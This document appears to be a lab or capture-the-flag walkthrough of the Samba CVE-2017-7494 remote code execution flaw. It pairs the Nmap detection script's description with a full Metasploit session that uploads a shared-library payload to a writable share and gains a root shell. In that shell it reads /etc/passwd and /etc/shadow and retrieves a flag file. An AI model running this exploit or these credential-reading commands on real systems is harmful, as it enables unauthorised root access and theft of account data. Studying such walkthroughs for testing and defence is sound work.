-- Script Summary --

Checks if target machines are vulnerable to the arbitrary shared library load vulnerability CVE-2017-7494.

Unpatched versions of Samba from 3.5.0 to 4.4.13, and versions prior to 4.5.10 and 4.6.4 are affected by a vulnerability that allows remote code execution, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.
The script does not scan the version numbers by default as the patches released for the mainstream Linux distributions do not change the version numbers.
The script checks the preconditions for the exploit to happen:

1) If the argument check-version is applied, the script will ONLY check services running potentially vulnerable versions of Samba, and run the exploit against those services. This is useful if you wish to scan a group of hosts quickly for the vulnerability based on the version number. However, because of their version number, some patched versions may still show up as likely vulnerable. Here, we use smb.get_os(host) to do versioning of the Samba version and compare it to see if it is a known vulnerable version of Samba. Note that this check is not conclusive: See 2,3,4
2) Whether there exists writable shares for the execution of the script. We must be able to write to a file to the share for the exploit to take place. We hence enumerate the shares using smb.share_find_writable(host) which returns the main_name, main_path and a list of writable shares.
3) Whether the workaround (disabling of named pipes) was applied. When "nt pipe support = no" is configured on the host, the service would not be exploitable. Hence, we check whether this is configured on the host using smb.share_get_details(host, 'IPC$'). The error returned would be "NT_STATUS_ACCESS_DENIED" if the workaround is applied.
4) Whether we can invoke the payloads from the shares. Using payloads from Metasploit, we upload the library files to the writable share obtained from 2). We then make a named pipe request using NT_CREATE_ANDX_REQUEST to the actual local filepath and if the payload executes, the status return will be false. Note that only Linux_x86 and Linux_x64 payloads are tested in this script.

This script is based on the metasploit module written by hdm.

References:
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rb
https://www.samba.org/samba/security/CVE-2017-7494.html
http://blog.nsfocus.net/samba-remote-code-execution-vulnerability-analysis/


nmap --script smb-vuln-cve-2017-7494 -p 445 <target>
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <target>



msf6 > search cve-2017-7494

Matching Modules
================

   #   Name                                   Disclosure Date  Rank       Check  Description
   -   ----                                   ---------------  ----       -----  -----------
   0   exploit/linux/samba/is_known_pipename  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   1     \_ target: Automatic (Interact)      .                .          .   .
   2     \_ target: Automatic (Command)       .                .          .   .
   3     \_ target: Linux x86                 .                .          .   .
   4     \_ target: Linux x86_64              .                .          .   .
   5     \_ target: Linux ARM (LE)            .                .          .   .
   6     \_ target: Linux ARM64               .                .          .   .
   7     \_ target: Linux MIPS                .                .          .   .
   8     \_ target: Linux MIPSLE              .                .          .   .
   9     \_ target: Linux MIPS64              .                .          .   .
   10    \_ target: Linux MIPS64LE            .                .          .   .
   11    \_ target: Linux PPC                 .                .          .   .
   12    \_ target: Linux PPC64               .                .          .   .
   13    \_ target: Linux PPC64 (LE)          .                .          .   .
   14    \_ target: Linux SPARC               .                .          .   .
   15    \_ target: Linux SPARC64             .                .          .   .
   16    \_ target: Linux s390x               .                .          .   .


Interact with a module by name or index. For example info 16, use 16 or use exploit/linux/samba/is_known_pipename
After interacting with a module you can manually set a TARGET with set TARGET 'Linux s390x'

msf6 > use exploit/linux/samba/is_known_pipename
msf6 exploit(linux/samba/is_known_pipename) >
f6 exploit(linux/samba/is_known_pipename) > options 

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CHOST                            no        The local client address
   CPORT                            no        The local client port
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni,
                                              socks4, socks5, socks5h
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metaspl
                                              oit.html
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory

Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)

View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/is_known_pipename) > set RHOSTS 172.20.29.54
RHOSTS => 172.20.29.54
msf6 exploit(linux/samba/is_known_pipename) > check 
[*] 172.20.29.54:445 - The target appears to be vulnerable. Samba version 4.6.3 found with writeable share 'myshare'
msf6 exploit(linux/samba/is_known_pipename) > exploit 
[*] 172.20.29.54:445 - Using location \\172.20.29.54\myshare\ for the path
[*] 172.20.29.54:445 - Retrieving the remote path of the share 'myshare'
[*] 172.20.29.54:445 - Share 'myshare' has server-side path '/home/share
[*] 172.20.29.54:445 - Uploaded payload to \\172.20.29.54\myshare\QoSNtWrq.so
[*] 172.20.29.54:445 - Loading the payload from server-side path /home/share/QoSNtWrq.so using \\PIPE\/home/share/QoSNtWrq.so...
[-] 172.20.29.54:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 172.20.29.54:445 - Loading the payload from server-side path /home/share/QoSNtWrq.so using /home/share/QoSNtWrq.so...
[+] 172.20.29.54:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (172.20.29.125:39837 -> 172.20.29.54:445) at 2025-11-14 09:35:52 -0600

] Command shell session 1 opened (172.20.29.125:39837 -> 172.20.29.54:445) at 2025-11-14 09:35:52 -0600

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
ls -l

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash

root@0e85a1227369:/# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:107::/var/run/dbus:/bin/false
root@0e85a1227369:/# 

root@0e85a1227369:/# cat /etc/shadow
cat /etc/shadow
root:*:17273:0:99999:7:::
daemon:*:17273:0:99999:7:::
bin:*:17273:0:99999:7:::
sys:*:17273:0:99999:7:::
sync:*:17273:0:99999:7:::
games:*:17273:0:99999:7:::
man:*:17273:0:99999:7:::
lp:*:17273:0:99999:7:::
mail:*:17273:0:99999:7:::
news:*:17273:0:99999:7:::
uucp:*:17273:0:99999:7:::
proxy:*:17273:0:99999:7:::
www-data:*:17273:0:99999:7:::
backup:*:17273:0:99999:7:::
list:*:17273:0:99999:7:::
irc:*:17273:0:99999:7:::
gnats:*:17273:0:99999:7:::
nobody:*:17273:0:99999:7:::
systemd-timesync:*:17273:0:99999:7:::
systemd-network:*:17273:0:99999:7:::
systemd-resolve:*:17273:0:99999:7:::
systemd-bus-proxy:*:17273:0:99999:7:::
_apt:*:17273:0:99999:7:::
messagebus:*:17329:0:99999:7:::
root@0e85a1227369:/#

root@0e85a1227369:/tmp# find / -type f -name secret.txt 2>/dev/null
find / -type f -name secret.txt 2>/dev/null
/secret.txt

root@0e85a1227369:/# cat secret.txt 
cat secret.txt
AvadaKedavra
root@0e85a1227369:/#



https://nmap.org/nsedoc/scripts/smb-vuln-cve-2017-7494.html
